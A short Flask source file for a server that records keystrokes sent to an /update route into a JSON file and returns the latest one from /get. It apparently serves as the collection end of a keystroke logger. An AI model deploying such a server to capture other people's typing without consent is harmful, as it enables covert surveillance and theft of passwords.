from flask import Flask
import json
from flask import render_template

app = Flask(__name__, static_url_path='/static')

@app.route("/")
def home():
        return render_template('index.html')


@app.route("/update/<keystroke>")
def update(keystroke):
        keystrokes = open("data.json", "r").read()        
        keystrokes = json.loads(keystrokes)
        keystrokes.append(keystroke)
        fp = open("data.json", "w")
        fp.write(json.dumps(keystrokes))  
        
        return "Logged"

@app.route("/get")
def get():
        keystrokes = open("data.json", "r").read()
        keystrokes = json.loads(keystrokes)
        last = len(keystrokes) - 1

        if len(keystrokes) < 0:
                return "{}"
        else:
                return str(last) + " " + keystrokes[last]

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=2000)
